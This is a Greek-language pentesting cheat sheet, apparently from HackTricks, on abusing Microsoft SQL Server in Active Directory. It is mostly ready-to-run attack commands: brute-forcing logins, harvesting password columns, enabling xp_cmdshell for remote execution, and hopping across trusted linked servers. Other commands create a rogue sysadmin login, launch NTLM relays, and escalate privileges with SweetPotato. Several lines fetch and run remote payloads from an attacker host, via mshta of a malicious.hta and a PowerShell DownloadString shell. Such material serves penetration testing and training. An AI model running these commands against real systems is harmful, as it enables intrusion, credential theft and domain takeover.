# Κατάχρηση MSSQL στο AD

{{#include ../../banners/hacktricks-training.md}}


## **Απαρίθμηση / Εντοπισμός MSSQL**

### Python

Το εργαλείο [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) βασίζεται στο Impacket. Υποστηρίζει authentication με Kerberos tickets και attacks μέσω αλυσίδων linked-server.<sup>[[1]](#references)</sup>

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### Απαρίθμηση από το δίκτυο χωρίς session τομέα
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

```
---
### PowerShell

Το PowerShell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) παρέχει functions για ανακάλυψη, auditing και exploitation σε SQL Server environments.<sup>[[2]](#references)</sup>
```bash
Import-Module .\PowerupSQL.psd1
```
### Enumeration από το δίκτυο χωρίς domain session
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have an AD account, you can try to find MSSQL instances by scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Απαρίθμηση από το εσωτερικό του domain
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check connectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in one line
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## Βασική Κατάχρηση MSSQL

### Πρόσβαση σε DB
```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & password in the example)
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CSVs are generated in the current directory)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Ενδέχεται επίσης να είναι δυνατή η **εκτέλεση εντολών** στον MSSQL host μέσω του `xp_cmdshell`.<sup>[[5]](#references)</sup>
```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Δείτε στη σελίδα που αναφέρεται στην **ακόλουθη ενότητα πώς να το κάνετε χειροκίνητα.**

### Βασικά MSSQL Hacking Tricks


{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## Έμπιστα Links MSSQL

Εάν ένα MSSQL instance εμπιστεύεται ένα άλλο μέσω μιας ρύθμισης linked-server, ένας χρήστης με επαρκή δικαιώματα μπορεί να **χρησιμοποιήσει αυτή τη σχέση εμπιστοσύνης για να εκτελέσει queries στο άλλο instance**. Αυτά τα links μπορούν να συνδεθούν αλυσιδωτά, φτάνοντας ενδεχομένως σε έναν improperly configured server στον οποίο ο χρήστης μπορεί να εκτελέσει commands.<sup>[[3]](#references)</sup>

**Τα links μεταξύ databases λειτουργούν ακόμη και μεταξύ forest trusts.**

### Κατάχρηση Powershell
```bash
#Look for MSSQL links from an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkId > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted-link query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
Ένα άλλο εργαλείο που μπορεί να χρησιμοποιηθεί είναι το [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>
```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```
### Metasploit

Μπορείτε εύκολα να ελέγξετε για αξιόπιστους συνδέσμους χρησιμοποιώντας το Metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Το Metasploit προσπαθεί να κάνει abuse μόνο της συνάρτησης `OPENQUERY()`. Αν η εκτέλεση εντολών μέσω `OPENQUERY()` αποτύχει, δοκιμάστε τη μέθοδο `EXECUTE` **χειροκίνητα**, όπως περιγράφεται παρακάτω.<sup>[[4]](#references)</sup>

### Χειροκίνητα - Openquery()

Από **Linux** μπορείτε να αποκτήσετε ένα MSSQL console shell με τα **sqsh** και **mssqlclient.py.**

Από **Windows**, μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **MSSQL client όπως το** [**HeidiSQL**](https://www.heidisql.com).<sup>[[7]](#references)</sup>

_Σύνδεση με χρήση Windows authentication:_

![Metasploit - Χειροκίνητα - Openquery(): Σύνδεση με χρήση Windows authentication](<../../images/image (808).png>)

#### Εύρεση αξιόπιστων συνδέσμων
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![Manual - Openquery() - Εύρεση Trustable Links: EXEC sp linkedservers;](<../../images/image (716).png>)

#### Εκτέλεση queries σε trustable link

Εκτελέστε queries μέσω του link (παράδειγμα: βρείτε περισσότερα links στο νέο προσβάσιμο instance):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> Ελέγξτε πού χρησιμοποιούνται τα διπλά και τα μονά εισαγωγικά· είναι σημαντικό να χρησιμοποιούνται με αυτόν τον τρόπο.

![Εύρεση αξιόπιστων συνδέσμων - Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο: Ελέγξτε πού χρησιμοποιούνται τα διπλά και τα μονά εισαγωγικά· είναι σημαντικό να χρησιμοποιούνται με αυτόν τον τρόπο](<../../images/image (643).png>)

Μπορείτε να συνεχίσετε να διασχίζετε χειροκίνητα αυτές τις αλυσίδες trusted-link.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Εάν δεν μπορείτε να εκτελέσετε ενέργειες όπως `exec xp_cmdshell` μέσω `OPENQUERY()`, δοκιμάστε τη μέθοδο `EXECUTE`.

### Χειροκίνητα - EXECUTE

Μπορείτε επίσης να κάνετε abuse σε trusted links χρησιμοποιώντας το `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Τοπική Κλιμάκωση Προνομίων

Ο **λογαριασμός υπηρεσίας MSSQL** διαθέτει συχνά το δικαίωμα χρήστη **`SeImpersonatePrivilege`**, το οποίο επιτρέπει στον λογαριασμό να υποδύεται έναν client μετά τον έλεγχο ταυτότητας.

Μια στρατηγική που έχουν επινοήσει πολλοί συγγραφείς είναι να εξαναγκάσουν μια υπηρεσία SYSTEM να πραγματοποιήσει έλεγχο ταυτότητας σε μια rogue ή man-in-the-middle υπηρεσία που δημιουργεί ο attacker. Αυτή η rogue υπηρεσία μπορεί στη συνέχεια να υποδυθεί την υπηρεσία SYSTEM ενώ εκείνη προσπαθεί να πραγματοποιήσει έλεγχο ταυτότητας.

Το [SweetPotato](https://github.com/CCob/SweetPotato) συγκεντρώνει αρκετές από αυτές τις τεχνικές και μπορεί να εκτελεστεί μέσω της εντολής `execute-assembly` του Beacon.<sup>[[8]](#references)</sup>



### NTLM Relay στο SCCM Management Point (Εξαγωγή OSD Secret)
Δείτε πώς μπορούν να γίνει abuse των προεπιλεγμένων SQL ρόλων των **Management Points** του SCCM για την απόρριψη των Network Access Account και Task-Sequence secrets απευθείας από τη site database:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

## References

- [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
- [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [3] [Microsoft Learn – Συνδεδεμένοι servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
- [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
- [5] [Microsoft Learn – Επιλογή διαμόρφωσης server xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
- [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
- [7] [HeidiSQL](https://www.heidisql.com)
- [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
{{#include ../../banners/hacktricks-training.md}}
